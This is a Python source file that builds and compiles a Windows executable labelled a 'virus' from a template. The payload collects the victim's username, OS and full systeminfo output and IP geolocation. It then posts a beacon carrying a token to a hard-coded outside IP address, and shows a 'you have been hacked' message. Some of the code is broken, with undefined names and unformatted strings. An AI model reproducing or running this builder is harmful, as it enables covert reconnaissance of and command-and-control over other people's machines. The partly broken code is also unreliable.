import subprocess
import argparse
import json
from collections import defaultdict
import subprocess

# Boilerplate template with placeholders for parameters
template = """
import pkgutil
import requests
import tempfile
import os
import getpass
import platform
import json
import subprocess
subprocess.call('dir', shell=True) 
from collections import defaultdict

# Get the operating system name
os_name = platform.system()
print("Operating System:", os_name)

# Get the release version
os_release = platform.release()
print("Release Version:", os_release)

# Get the machine architecture
os_architecture = platform.machine()
print("Machine Architecture:", os_architecture)

#Other machine stuff
print("Other machine stuff")
print(platform.uname())

# Get the current username
username = getpass.getuser()
print("Username:", username)

# Make an API request to obtain IP geolocation information
ipResponse = requests.get('http://ip-api.com/json')
ipData = ipResponse.json()
print(ipData)

# Print the IP location details
print("IP:", ipData['query'])
print("Status:", ipData['status'])
print("Country:", ipData['country'])
print("Country Code:", ipData['countryCode'])
print("Region:", ipData['region'])
print("Region Name:", ipData['regionName'])
print("City:", ipData['city'])
print("Zip:", ipData['zip'])
print("Latitude:", ipData['lat'])
print("Longitude:", ipData['lon'])
print("Timezone:", ipData['timezone'])
print("ISP:", ipData['isp'])
print("Organization:", ipData['org'])
print("AS:", ipData['as'])





def get_system_info():
    # Execute the systeminfo command
    process = subprocess.Popen('systeminfo', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()

    if process.returncode == 0:
        # Convert the output to string and split it into lines
        lines = output.decode().splitlines()

        # Parse the relevant information
        system_info = {system_info}
        for line in lines:
            if ':' in line:
                key, value = line.split(':', 1)
                system_info[key.strip()] = value.strip()

        return system_info
    else:
        print("Error executing systeminfo command: " + error.decode())
        return None

# Example usage
info = get_system_info()
if info:
    print("System Information:")
    for key, value in info.items():
        print(key + " : " + value)




# Read the cert data
# cert_data = pkgutil.get_data('certifi', 'cacert.pem')

# Write the cert data to a temporary file
# handle = tempfile.NamedTemporaryFile(delete=False)
# handle.write(cert_data)
# handle.flush()

# Set the temporary file name to an environment variable for the requests package
# os.environ['REQUESTS_CA_BUNDLE'] = handle.name

def display_message(user_id, virus_type):
    os.system('echo You have been hacked by user: {user_id} with virus: {virus_type}! (Not really) && pause'.format(user_id, virus_type))

def send_request(user_id, token, virus_type, name, heartbeat_rate):
    url = 'http://129.151.211.93:5000/update'
    dataToSend = {{
        'user_id': '{user_id}',
        'token': '{token}',
        'virus_type': '{virus_type}',
        'name': '{name}',
        'heartbeat_rate': '{heartbeat_rate}',
    }}
    response = requests.post(url, json=dataToSend)
    logging.debug(f'Response status code: response.status_code')
    logging.debug(f'Response content: response.content')
    os.system('echo response.status_code , response.content && pause'.format(response.status_code, response.content))
    s.system('echo cmd testt && pause')

os.system('echo Displaying message')
display_message(user_id='{user_id}', virus_type='{virus_type}')
os.system('echo Trying to send request')
send_request(user_id='{user_id}', token='{token}', virus_type='{virus_type}', name='{name}', heartbeat_rate='{heartbeat_rate}')

raw_input("Program crashed; press Enter to exit")

# Clean up the temp file
os.remove(handle.name)
"""

def test():
    print("test")

def generateExe(source_file):
    # Call PyInstaller to compile the script to an exe
    try:
        subprocess.check_call(['python', '-m','PyInstaller', '--debug=all', '--distpath', '/dist', '--hidden-import=requests', '--hidden-import=stringprep' , '--onefile' , source_file])
        return "Success"
    except subprocess.CalledProcessError as e:
        print(f"PyInstaller failed with error code: {e.returncode}")
        return "Failed to compile"

def generateScript(user_id, token, virus_type, name, heartbeat_rate):
    # Fill in the template with the provided parameters
    # Initialize an empty JSON object
    empty_data = json.loads("{}")
    

    filled_template = template.format(
        user_id=user_id,
        token=token,
        virus_type=virus_type,
        name=name,
        heartbeat_rate=heartbeat_rate,
        ipData=empty_data,  # Empty placeholder for ipData
        system_info=empty_data
        
    )

    # Write the filled-in template to a new Python script
    with open('generated_script.py', 'w') as f:
        f.write(filled_template)

    # Write the filled-in template to a new Python script (duplicate line)
    with open('generated_script.py', 'w') as f:
        f.write(filled_template)

generateScript(1, '1234567890', 'Silent', 'TestVirus1', '1h')
#compile test
generateExe("generated_script.py")

# if __name__ == '__main__':
#     parser = argparse.ArgumentParser(description='Generate a Python script from parameters')
#     parser.add_argument('--user_id', required=True, type=int, help='User ID')
#     parser.add_argument('--token', required=True, help='Token')
#     parser.add_argument('--virus_type', required=True, help='Type of the virus')
#     parser.add_argument('--name', required=True, help='Name of the virus')
#     parser.add_argument('--heartbeat_rate', required=True, help='Heartbeat rate')

#     args = parser.parse_args()

#     generateScript(args.user_id, args.token, args.virus_type, args.name, args.heartbeat_rate)
